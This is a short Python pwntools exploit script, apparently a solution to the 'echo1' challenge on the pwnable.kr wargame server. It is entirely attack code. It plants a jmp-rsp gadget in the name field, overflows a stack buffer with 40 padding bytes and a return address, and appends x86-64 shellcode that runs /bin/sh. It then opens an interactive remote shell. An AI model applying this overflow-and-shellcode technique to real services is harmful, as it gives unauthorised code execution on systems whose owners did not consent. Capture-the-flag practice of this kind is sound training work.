from pwn import *

name = "\xff\xe4"
option = "1"

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = ""
payload += "\x41" * (40)
payload += struct.pack("L", 0x6020a0)
payload += shellcode

#sh = process("./echo1")
sh = remote("pwnable.kr", 9010) 
print sh.recv()
sh.sendline(name)
print "--------------"
print sh.recv()
print sh.recv()
sh.sendline(option)
print "--------------"
print sh.recv()
sh.sendline(payload)
print "--------------"
sh.interactive()

print name + "\n" + option + "\n" + payload + "\n"
